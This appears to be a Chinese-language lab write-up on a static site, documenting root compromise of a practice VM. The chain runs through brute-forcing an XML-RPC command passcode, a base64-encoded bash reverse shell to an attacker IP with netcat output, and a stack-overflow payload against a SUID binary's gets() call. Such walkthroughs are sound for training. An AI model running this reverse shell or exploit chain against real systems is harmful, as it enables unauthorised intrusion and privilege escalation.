+<span class="n">debugging_pass</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
+<span class="c1"># shell = True 任意命令执行？</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">runcmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="n">results</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+    <span class="n">output</span> <span class="o">=</span> <span class="n">results</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="o">+</span> <span class="n">results</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">output</span>
+<span class="c1"># 输出 CPU 状态</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">cpu</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">runcmd</span><span class="p">(</span><span class="s2">&quot;cat /proc/cpuinfo&quot;</span><span class="p">)</span>
+<span class="c1"># 之后的都懂了</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">mem</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">runcmd</span><span class="p">(</span><span class="s2">&quot;free -m&quot;</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">disk</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">runcmd</span><span class="p">(</span><span class="s2">&quot;df -h&quot;</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">net</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">runcmd</span><span class="p">(</span><span class="s2">&quot;ip a&quot;</span><span class="p">)</span>
+
+<span class="c1"># 根据 passcode 调用上面的任意命令执行指令</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">secure_cmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">passcode</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">passcode</span><span class="o">==</span><span class="n">debugging_pass</span><span class="p">:</span>
+         <span class="k">return</span> <span class="n">runcmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&quot;Wrong passcode.&quot;</span>
+
+<span class="c1"># 注册函数，开始启动服务器</span>
+<span class="n">server</span> <span class="o">=</span> <span class="n">SimpleXMLRPCServer</span><span class="o">.</span><span class="n">SimpleXMLRPCServer</span><span class="p">((</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="mi">8000</span><span class="p">))</span>
+<span class="n">server</span><span class="o">.</span><span class="n">register_function</span><span class="p">(</span><span class="n">cpu</span><span class="p">)</span>
+<span class="n">server</span><span class="o">.</span><span class="n">register_function</span><span class="p">(</span><span class="n">mem</span><span class="p">)</span>
+<span class="n">server</span><span class="o">.</span><span class="n">register_function</span><span class="p">(</span><span class="n">disk</span><span class="p">)</span>
+<span class="n">server</span><span class="o">.</span><span class="n">register_function</span><span class="p">(</span><span class="n">net</span><span class="p">)</span>
+<span class="n">server</span><span class="o">.</span><span class="n">register_function</span><span class="p">(</span><span class="n">secure_cmd</span><span class="p">)</span>
+<span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</code></pre></div></td></tr></table></div>
+<p>一个  XML-RPC 服务，服务端口在之前一直 <em>Error code 501</em> 的 8000</p>
+<p>了解一下 XML 语法，试试 POST 访问，并且调用 <code>cpu</code> 指令</p>
+<p><img alt="image-20251028131937431" src="../images/image-20251028131937431.png" /></p>
+<p>返回了预期的结果，现在的目标是爆破 <code>secure_cmd</code> 的四位密码</p>
+<p>（第一个参数为命令，第二个参数为 <code>passcode</code>）</p>
+<p><img alt="image-20251028132530801" src="../images/image-20251028132530801.png" /></p>
+<p>让 AI 给出一个最小化的爆破程序：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">xmlrpc.client</span>
+
+<span class="n">proxy</span> <span class="o">=</span> <span class="n">xmlrpc</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">ServerProxy</span><span class="p">(</span><span class="s2">&quot;http://10.0.2.6:8000&quot;</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span> <span class="mi">10000</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">proxy</span><span class="o">.</span><span class="n">secure_cmd</span><span class="p">(</span><span class="s2">&quot;whoami&quot;</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s2">&quot;Wrong passcode&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">):</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+</code></pre></div></td></tr></table></div>
+<p>很快给出了 <code>passcode</code></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; python3 exp.py
+5842
+</code></pre></div></td></tr></table></div>
+<p>确认一下，指令顺利执行：</p>
+<p><img alt="image-20251028134548773" src="../images/image-20251028134548773.png" /></p>
+<p>构建一个反弹 Shell，XML 会拒绝某些特殊字符出现在字符串中，所以 Base64 编码后再发送</p>
+<p>--&gt; <code>echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMy8xMjM0IDA+JjEK" | base64 -d | bash</code></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.0.2.3] from (UNKNOWN) [10.0.2.6] 33498
+bash: cannot set terminal process group (780): Inappropriate ioctl for device
+bash: no job control in this shell
+socnet@socnet2:~$ python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;
+python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;
+socnet@socnet2:~$ 
+</code></pre></div></td></tr></table></div>
+<p>获得了一个权限更高的 <code>socnet</code> 用户 Shell，下一步就是获取 <code>root</code> 用户</p>
+<p>考虑到之前发现过一个 suid 文件，扫一下 suid</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code>socnet@socnet2:~$ find / -perm -4000 -type f 2&gt;/dev/null
+/snap/core/17247/bin/mount
+/snap/core/17247/bin/ping
+# 省略很多文件...
+/home/socnet/add_record
+
+socnet@socnet2:~$ ls -l
+total 16
+-rwsrwsr-x 1 root   socnet 6952 Oct 29  2018 add_record
+-rw-rw-r-- 1 socnet socnet  904 Oct 29  2018 monitor.py
+drwxrwxr-x 4 socnet socnet 4096 Oct 29  2018 peda
+
+socnet@socnet2:~$ file add_record
+add_record: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e3fa9a66b0b1e3281ae09b3fb1b7b82ff17972d8, not stripped
+</code></pre></div></td></tr></table></div>
+<p>确定可疑文件 <code>add_record</code> ，是一个 ELF-32 文件，所有者为 root。没有提供源代码，需要动态调试甚至逆向（PWN or RE）</p>
+<blockquote>
+<p>有趣的是，add_record 同级文件夹中还有一个 peda 是 gdb 的一个插件，这明示了使用 gdb 进行动态调试🤓</p>
+</blockquote>
+<p>用 <code>gdb add_record</code> 先 run 一下</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span></pre></div></td><td class="code"><div><pre><span></span><code>gdb-peda$ run
+run
+Starting program: /home/socnet/add_record 
+Welcome to Add Record application
+Use it to add info about Social Network 2.0 Employees
+Employee Name(char): Unknown
+Unknown
+Years worked(int): 114
+114
+Salary(int): 514
+514
+Ever got in trouble? 1 (yes) or 0 (no): 1
+1
+Explain: Give me ur root account :)
+Give me ur root account :)
+Employee data you&#39;ve entered:
+Name Unknown
+
+Years 113, Salary 114, Trouble 1, Comments Give me ur root account :)
+[Inferior 1 (process 3123) exited normally]
+Warning: not running or target is remote
+</code></pre></div></td></tr></table></div>
+<p>没什么线索，用 IDA 逆向一番，发现一个直接叫作 backdoor 的函数，植入的是任意代码执行</p>
+<p><img alt="image-20251028143738469" src="../images/image-20251028143738469.png" /><img alt="image-20251028150451711" src="../images/image-20251028150451711.png" /></p>
+<p>不幸的是，这个函数没有被其他的任何函数引用，因此考虑需要在某处执行内存溢出攻击</p>
+<p>先记下后门函数的首地址 <code>0x08048676</code>，然后看看 <code>main</code> 函数的内容：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1">// bad sp value at call has been detected, the output may be wrong!</span>
+<span class="kt">int</span><span class="w"> </span><span class="kr">__cdecl</span><span class="w"> </span><span class="n">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">src</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span><span class="w"> </span><span class="c1">// [esp+0h] [ebp-ACh] BYREF</span>
+<span class="w">  </span><span class="n">_BYTE</span><span class="w"> </span><span class="n">v5</span><span class="p">[</span><span class="mi">96</span><span class="p">];</span><span class="w"> </span><span class="c1">// [esp+4h] [ebp-A8h] BYREF</span>
+<span class="w">  </span><span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">v6</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+64h] [ebp-48h] BYREF</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">v7</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+68h] [ebp-44h] BYREF</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">v8</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+6Ch] [ebp-40h] BYREF</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">s</span><span class="p">[</span><span class="mi">25</span><span class="p">];</span><span class="w"> </span><span class="c1">// [esp+73h] [ebp-39h] BYREF</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">v10</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+8Ch] [ebp-20h]</span>
+<span class="w">  </span><span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">stream</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+90h] [ebp-1Ch]</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">v12</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+94h] [ebp-18h]</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">p_argc</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+9Ch] [ebp-10h]</span>
+
+<span class="w">  </span><span class="n">p_argc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">argc</span><span class="p">;</span>
+<span class="w">  </span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">16718</span><span class="p">;</span>
+<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">v5</span><span class="p">));</span>
+<span class="w">  </span><span class="n">stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="s">&quot;employee_records.txt&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;a&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Welcome to Add Record application</span><span class="se">\n</span><span class="s">Use it to add info about Social Network 2.0 Employees&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Employee Name(char): &quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="mi">25</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Years worked(int): &quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v8</span><span class="p">);</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Salary(int): &quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v7</span><span class="p">);</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Ever got in trouble? 1 (yes) or 0 (no): &quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v6</span><span class="p">);</span>
+<span class="w">  </span><span class="k">do</span>
+<span class="w">    </span><span class="n">v10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getchar</span><span class="p">();</span>
+<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">v10</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">v10</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">-1</span><span class="w"> </span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">v6</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mi">1</span><span class="w"> </span><span class="p">)</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Explain: &quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">src</span><span class="p">);</span>
+<span class="w">    </span><span class="n">vuln</span><span class="p">(</span><span class="n">src</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Employee data you&#39;ve entered:&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Name %s</span><span class="se">\n</span><span class="s">Years %d, Salary %d, Trouble %d, Comments %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">v8</span><span class="p">,</span><span class="w"> </span><span class="n">v7</span><span class="p">,</span><span class="w"> </span><span class="n">v6</span><span class="p">,</span><span class="w"> </span><span class="n">src</span><span class="p">);</span>
+<span class="w">  </span><span class="n">v12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">src</span><span class="p">;</span>
+<span class="w">  </span><span class="n">stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v6</span><span class="p">;</span>
+<span class="w">  </span><span class="n">fprintf</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Name %s</span><span class="se">\n</span><span class="s">Years %d, Salary %d, Trouble %d, Comments %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">v8</span><span class="p">,</span><span class="w"> </span><span class="n">v7</span><span class="p">);</span>
+<span class="w">  </span><span class="n">fclose</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></td></tr></table></div>
+<p>根据之前写 PWN 题的经验，<code>gets(src);</code> 这里完全不限制输入长度，考虑从这里栈溢出攻击</p>
+<p>这里需要构造一个足够长的字符串，使得 <code>eip</code> 寄存器的值被顺利覆盖，并且覆盖是可控的</p>
+<p>不妨构造这样的字符串，确保任取四位字符对应的 ASCII 结果不同：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>aaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaaaAaaaBaaaCaaaDaaaEaaaFaaaGaaaHaaaIaaaJaaaKaaaLaaaMaaaNaaaOaaaPaaaQaaaRaaaSaaaTaaaUaaaVaaaWaaaXaaaYaaaZ...
+</code></pre></div></td></tr></table></div>
+<p>然后进行测试：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code>Explain: aaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaaaAaaaBaaaCaaaDaaaEaaaFaaaGaaaHaaaIaaaJaaaKaaaLaaaMaaaNaaaOaaaPaaaQaaaRaaaSaaaTaaaUaaaVaaaWaaaXaaaYaaaZ
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffdc1e (&quot;aaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaaaAaaaBaaaCaaaDaaaEaaaFaaaGaaaHaaaIaaaJaaaKaaaLaaaMaaaNaaaOaaaPaaaQaaaRaaaSaaaTaaaUaaaVaaaWaaaX&quot;...)
+EBX: 0x61616e61 (&#39;anaa&#39;)
+ECX: 0xffffdd40 (&quot;aaaXaaaYaaaZ&quot;)
+EDX: 0xffffdce2 (&quot;aaaXaaaYaaaZ&quot;)
+ESI: 0xf7fc2000 --&gt; 0x1d4d6c 
+EDI: 0xffffdce0 (&quot;aWaaaXaaaYaaaZ&quot;)
+EBP: 0x61616f61 (&#39;aoaa&#39;)
+ESP: 0xffffdc60 (&quot;aqaaaraaasaaataaauaaavaaawaaaxaaayaaazaaaAaaaBaaaCaaaDaaaEaaaFaaaGaaaHaaaIaaaJaaaKaaaLaaaMaaaNaaaOaaaPaaaQaaaRaaaSaaaTaaaUaaaVaaaWaaaXaaaYaaaZ&quot;)
+EIP: 0x61617061 (&#39;apaa&#39;)
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+</code></pre></div></td></tr></table></div>
+<p><code>EIP</code> 的值为 <code>apaa</code>，我们知道了这四位字符串对应的位置就是写入返回地址的位置，尝试注入后门函数的首地址 <code>0x08048676</code>，虽然无法输入 <code>\x86</code> 这样的原始十六进制，但是可以通过 payload 脚本实现</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>python -c &quot;import struct; print(&#39;1\n1\n1\n1\n&#39; + &#39;aaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaa&#39; + &#39;\x76\x86\x04\x08&#39;)&quot; &gt; payload
+</code></pre></div></td></tr></table></div>
+<p>在 gdb 中试一试：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code>gdb-peda$ r &lt; payload
+Starting program: /home/socnet/add_record &lt; payload
+Welcome to Add Record application
+Use it to add info about Social Network 2.0 Employees
+[New process 3317]
+process 3317 is executing new program: /bin/dash
+[New process 3318]
+process 3318 is executing new program: /bin/bash
+[Inferior 3 (process 3318) exited normally]
+Warning: not running or target is remote
+</code></pre></div></td></tr></table></div>
+<p>发现多了两个 <code>/bin/bash</code> 进程，说明栈溢出攻击成功了，在实际程序中检验</p>
+<p><img alt="image-20251028153025703" src="../images/image-20251028153025703.png" /></p>
+<hr />
+<h2 id="_7">渗透结果</h2>
+<p>成功获得了 root 账户权限，修改密码在靶机登录</p>
+<p><img alt="image-20251028153200797" src="../images/image-20251028153200797.png" /></p>
+<hr />
+<h2 id="_8">问题分析/启示</h2>
+<ol>
+<li>对 Linux 程序进行栈溢出攻击时，不易判断地址覆盖点</li>
+</ol>
+<p>使用经过特殊构造的字符串（AAAB 式），确保可以通过 EIP 的 4 位输出定位覆盖点</p>
+<hr />
+<h2 id="_9">其他</h2>
+<p>获取 root 权限用时约 5h</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../stylesheets/extra.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+      
+    
+  </body>
+</html>
